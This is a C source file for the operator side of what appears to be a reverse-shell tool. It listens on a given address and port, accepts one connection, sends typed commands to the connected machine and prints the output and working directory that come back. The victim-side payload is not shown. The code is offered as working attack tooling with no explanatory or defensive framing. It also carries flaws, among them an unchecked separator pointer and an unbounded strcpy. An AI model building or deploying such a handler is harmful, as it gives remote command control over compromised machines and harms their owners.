#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


/* Pound define the size for buffer */

#define BUFFER_SIZE (1024)
#define BACKLOG (3)
#define SEPARATOR ("<SePaRaToR>")

int main(int argc, char *argv[]) {
  int server_fd;
  int client_fd;
  struct sockaddr_in server_addr;
  struct sockaddr_in client_addr;

  char buffer[BUFFER_SIZE];
  char cwd[BUFFER_SIZE];
  char output[BUFFER_SIZE];

  if (argc != 3) {
    perror("please provide the right arguments\n");
    return -1;
  }

  printf("[*] Listening on %s:%s...\n", argv[1], argv[2]);

  server_fd = socket(AF_INET, SOCK_STREAM, 0);
  if (server_fd <= 0) {
    perror("socket setup failed\n");
    return -1;
  }

  /* optional: attached the socket forcefully. Sometimes the port */
  /* won't be release after the program stops                     */
  /*
  int opt = 1;
  if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
      &opt, sizeof(opt))) {
    perror("setsockopt failed \n");
    return -1;
  }
  */

  /* Set up the server address and port                           */

  server_addr.sin_family = AF_INET;
  inet_pton(AF_INET, argv[1], &server_addr.sin_addr);
  server_addr.sin_port = htons(atoi(argv[2]));

  /* Binding the socket                                           */

  if (bind(server_fd, (struct sockaddr *) &server_addr,
      sizeof(server_addr)) < 0) {
    perror("bind failed\n");
    return -1;
  }

  /* Socket start listening                                       */

  if (listen(server_fd, BACKLOG) < 0) {
    perror("listen failed\n");
    return -1;
  }

  int client_addr_size = sizeof(client_addr);
  client_fd = accept(server_fd, (struct sockaddr *) &client_addr,
                     (socklen_t *) &client_addr_size);

  if (client_fd < 0) {
    perror("accept failed\n");
    return -1;
  }

  printf("[*] Connected to %s:%s\n", inet_ntoa(client_addr.sin_addr), argv[2]);

  if (recv(client_fd, cwd, BUFFER_SIZE, 0) < 0) {
    perror("recv cwd failed\n");
    return -1;
  }

  while (1) {
    memset(buffer, 0, BUFFER_SIZE);
    memset(output, 0, BUFFER_SIZE);

    printf("%s> ", cwd);
    scanf("%511[^\n]%*c", buffer);

    if (send(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
      perror("send failed");
      return -1;
    }

    if (recv(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
      perror("recv failed\n");
      return -1;
    }

    char *separator = strstr(buffer, SEPARATOR);
    char *new_cwd = separator + strlen(SEPARATOR);

    strcpy(cwd, new_cwd);
    cwd[strlen(new_cwd) + 1] = '\0';

    memcpy(output, buffer, separator - buffer);
    printf("%s", output);
  }
  return 0;
}